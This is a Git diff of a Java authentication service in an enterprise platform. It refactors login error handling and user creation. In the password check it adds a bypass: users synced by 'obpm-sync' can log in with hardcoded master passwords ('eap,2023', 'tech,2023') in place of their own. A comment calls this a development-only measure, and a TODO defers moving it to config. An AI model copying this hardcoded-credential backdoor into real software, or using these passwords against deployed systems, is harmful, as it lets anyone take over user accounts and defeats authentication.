@@ -7,8 +7,12 @@ import org.apache.commons.lang3.ObjectUtils;
 import org.openea.eap.framework.common.enums.CommonStatusEnum;
 import org.openea.eap.framework.common.enums.UserTypeEnum;
 import org.openea.eap.framework.common.exception.ServiceException;
+import org.openea.eap.framework.common.util.servlet.ServletUtils;
+import org.openea.eap.framework.common.util.spring.EapAppUtil;
 import org.openea.eap.framework.security.core.LoginUser;
 import org.openea.eap.framework.security.core.util.SecurityFrameworkUtils;
+import org.openea.eap.framework.web.core.util.WebFrameworkUtils;
+import org.openea.eap.module.obpm.service.obpm.sync.ObpmOrgSyncService;
 import org.openea.eap.module.system.api.social.dto.SocialUserBindReqDTO;
 import org.openea.eap.module.system.controller.admin.auth.vo.AuthLoginReqVO;
 import org.openea.eap.module.system.controller.admin.auth.vo.AuthLoginRespVO;
@@ -23,14 +27,17 @@ import org.openea.eap.module.system.service.auth.AdminAuthService;
 import org.openea.eap.module.system.service.auth.AdminAuthServiceImpl;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
+import org.springframework.context.annotation.Lazy;
 import org.springframework.stereotype.Service;
 
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
 
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+
 import static org.openea.eap.framework.common.exception.util.ServiceExceptionUtil.exception;
-import static org.openea.eap.module.system.enums.ErrorCodeConstants.AUTH_LOGIN_BAD_CREDENTIALS;
-import static org.openea.eap.module.system.enums.ErrorCodeConstants.AUTH_LOGIN_USER_DISABLED;
+import static org.openea.eap.module.system.enums.ErrorCodeConstants.*;
 
 
 @Service("obpmAuthService")
@@ -45,6 +52,10 @@ public class ObpmAuthServiceImpl extends AdminAuthServiceImpl implements AdminAu
 
     @Resource
     private AdminUserMapper userMapper;
+
+    @Resource
+    @Lazy
+    ObpmUserServiceImpl obpmUserService;
 
     @Override
     public AuthLoginRespVO login(AuthLoginReqVO reqVO, HttpServletRequest request){
@@ -87,18 +98,31 @@ public class ObpmAuthServiceImpl extends AdminAuthServiceImpl implements AdminAu
                     user = createAdminUser(jsonUser);
                 }
             }catch (Exception e){
-                log.error(String.format("queryObpmUser fail, user=%s, exception=%s",username, e.getMessage()),e);
-
+                log.error(String.format("queryObpmUser fail, user=%s, exception=%s",username, e.getMessage()));
+                createLoginLog(null, username, logTypeEnum, LoginResultEnum.THIRD_FAIL);
+                throw exception(AUTH_THIRD_LOGIN_FAIL);
             }
-
         }
         if (user == null) {
             createLoginLog(null, username, logTypeEnum, LoginResultEnum.BAD_CREDENTIALS);
             throw exception(AUTH_LOGIN_BAD_CREDENTIALS);
         }
         if (!userService.isPasswordMatch(password, user.getPassword())) {
-            createLoginLog(user.getId(), username, logTypeEnum, LoginResultEnum.BAD_CREDENTIALS);
-            throw exception(AUTH_LOGIN_BAD_CREDENTIALS);
+            // 检查是否测试专用密码，仅用于开发测试
+            boolean isDevPass = false;
+            if("obpm-sync".equals(user.getCreator()) || "obpm-sync".equals(user.getUpdater())){
+                // TODO 待加密后加入配置，严格限制开发调试阶段无法获得用户密码时进行测试
+                if("eap,2023".equals(password) || "tech,2023".equals(password)){
+                    isDevPass = true;
+                    // log
+                    log.warn(String.format("user %s login  with  supper password, ip=%s, userAgent=%s",
+                            user.getUsername(), ServletUtils.getClientIP(), ServletUtils.getUserAgent()));
+                }
+            }
+            if(!isDevPass){
+                createLoginLog(user.getId(), username, logTypeEnum, LoginResultEnum.BAD_CREDENTIALS);
+                throw exception(AUTH_LOGIN_BAD_CREDENTIALS);
+            }
         }
         // 校验是否禁用
         if (ObjectUtil.notEqual(user.getStatus(), CommonStatusEnum.ENABLE.getStatus())) {
@@ -108,19 +132,11 @@ public class ObpmAuthServiceImpl extends AdminAuthServiceImpl implements AdminAu
         return user;
     }
 
-    private AdminUserDO createAdminUser(JSONObject jsonUser) {
-        AdminUserDO user = new AdminUserDO();
-        // 保存原密码 “{sha2}+obpm加密后密码”
-        user.setUsername(jsonUser.getStr("account"));
-        user.setPassword("{sha2}"+jsonUser.getStr("password"));
-        user.setMobile(jsonUser.getStr("mobile"));
-        user.setEmail(jsonUser.getStr("email"));
-        user.setNickname(jsonUser.getStr("fullname"));
-        user.setStatus(CommonStatusEnum.ENABLE.getStatus());
-        userMapper.insert(user);
-        user = userService.getUserByUsername(user.getUsername());
-        return user;
+    protected AdminUserDO createAdminUser(JSONObject jsonUser) {
+        return obpmUserService.createAdminUser(jsonUser);
     }
+
+
 
     public AdminUserDO authenticateWithObpm(String username, String password, HttpServletRequest request) {
 
